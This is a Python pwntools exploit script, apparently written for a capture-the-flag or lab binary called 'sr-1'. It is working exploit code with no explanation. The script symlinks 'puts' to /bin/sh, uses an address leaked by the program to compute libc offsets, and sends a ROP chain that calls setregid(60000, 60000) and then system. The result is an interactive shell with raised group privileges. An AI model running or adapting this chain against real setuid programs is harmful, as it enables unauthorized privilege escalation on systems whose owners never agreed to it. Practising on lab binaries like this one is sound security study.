from pwn import *

GARB = 'bbbbbbbb'

env = {'PATH' : '.:/bin:/usr/bin'}

# Requires symlink from puts to /bin/sh
if os.path.exists("puts"):
    os.remove("puts")
os.symlink("//bin/sh", "puts")

system_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['system']
prctl_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['prctl']
execve_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['execve']

offset_sys = 0x5abdd8
offset_sys = offset_sys * -1
offset_set = 0x4f3f68
offset_set = offset_set * -1


# Addresses needed for the attack
pop_rdi_ret_addr = 0x400783 # From ROPgadget --binary ./rop-leak-got-64
pop_rsi_pop_r15_addr = 0x400781
execve_got_addr = 0x601040 # Address of the got entry
puts_string_addr = 0x400392
id_num = 60000


# Launch processs
p = process('./sr-1', env=env)

# Read 8 bytes
print(p.recvline())
print(p.recvline())
p.sendline('136')

data = p.recvline()
data2 = data[:128]
data3 = data[88:96]

leak = u64(data3)
sys = leak + offset_sys
setregid = leak + offset_set

p.sendline(data2 + 'a'*8 + p64(pop_rdi_ret_addr) + p64(id_num) + p64(pop_rsi_pop_r15_addr) + p64(id_num) + p64(0) + p64(setregid)+ p64(pop_rdi_ret_addr) + p64(puts_string_addr) + p64(sys))

p.interactive()
